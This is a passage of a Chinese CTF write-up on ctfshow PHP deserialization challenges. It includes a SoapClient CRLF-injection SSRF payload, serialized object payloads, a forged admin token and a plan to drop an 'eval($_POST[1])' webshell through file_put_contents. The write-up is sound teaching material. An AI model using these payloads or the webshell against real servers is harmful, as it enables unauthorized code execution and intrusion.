data-num=\"4\"></td><td><pre>X-Forwarded-For:127.0.0.1</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>token=ctfshow</pre></td></tr></tbody></table></figure><p>所以 payload</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$url</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"http://127.0.0.1/flag.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$post</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"token=ctfshow\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SoapClient</span><span class=\"token punctuation\">(</span><span class=\"token constant\">null</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'location'</span> <span class=\"token operator\">=&gt;</span> <span class=\"token variable\">$url</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'user_agent'</span><span class=\"token operator\">=&gt;</span><span class=\"token string single-quoted-string\">'xx^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded ^^Content-Length:'</span><span class=\"token operator\">.</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$post</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'^^^^'</span><span class=\"token operator\">.</span><span class=\"token variable\">$post</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'uri'</span><span class=\"token operator\">=&gt;</span><span class=\"token string single-quoted-string\">'ssrf'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'^^'</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\\r\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h1 id=\"web-260\"><a class=\"anchor\" href=\"#web-260\">#</a> web 260</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/ctfshow_i_love_36D/'</span><span class=\"token punctuation\">,</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctfshow'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>由源码知，只需反序列化后的字符串包含 <code>ctfshow_i_love_36D</code>  即可</p>\n<p>那么 payload 可以为</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"ctfshow_i_love_36D\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h1 id=\"web-261\"><a class=\"anchor\" href=\"#web-261\">#</a> web 261</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfshowvip</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span><span class=\"token operator\">=</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">||</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__sleep</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span><span class=\"token operator\">=</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">code</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">code</span><span class=\"token operator\">==</span><span class=\"token number\">0x36d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'vip'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>这题主要考察魔术方法的应用，</p>\n<p><code>__construct</code>  为构造方法，</p>\n<p><code>__wakeup</code>  准备对象资源，</p>\n<p><code>__invoke</code>  当尝试以调用函数的方式调用一个对象时， <code>__invoke()</code>  方法会被自动调用。</p>\n<p><code>__sleep()</code>  方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。</p>\n<p><code>__unserialize</code>  反序列化调用的方法</p>\n<p><code>__destruct</code>  析构方法</p>\n<p>而如果类中同时定义了 <code>__unserialize</code>  和 <code>__wakeup()</code>  两个魔术方法，则只有 <code>__unserialize()</code>  方法会生效， <code>__wakeup()</code>  方法会被忽略。</p>\n<p>而在代码中，我们必然只能调用 <code>__unserialize</code>  和 <code>__destruct</code>  两个方法</p>\n<p>其中 <code>__destruct</code>  中由 <code>file_put_contents</code>  可以想到写一句话到文件里，其只需要 <code>$this-&gt;code==0x36d</code>  即可</p>\n<p>观察到为 <code>==</code>  即若等于，那么可以弄出 <code>877.phpxxx==0x36d</code> ，即控制了文件名，而内容为一句话，也可以控制</p>\n<p>观察到反序列化中均可控，那么可以使 <code>$username='877.php'</code> , <code>$password='&lt;?php eval($_POST[1]);?&gt;'</code></p>\n<p>即可成功写入一句话，之后正常 rce 即可</p>\n<h1 id=\"web262\"><a class=\"anchor\" href=\"#web262\">#</a> web262</h1>\n<p>源码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-12-03 02:37:19</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-12-03 16:05:38</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @message.php</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>*/</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token variable\">$f</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'f'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$m</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'m'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token variable\">$t</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'t'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token variable\">$umsg</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'fuck'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'loveU'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$msg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">,</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$umsg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Your message has been sent'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>进入后发现并没有提供 flag 的地方，从头阅读源码，可以看到最上面注释有 <code>message.php</code> ，访问，得到</p>\n<p>message.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-12-03 15:13:03</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-12-03 15:17:17</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$msg</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">token</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>阅读代码，可知只需构造一个 message 类，token 为 <code>admin</code>  即可，故 exp.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    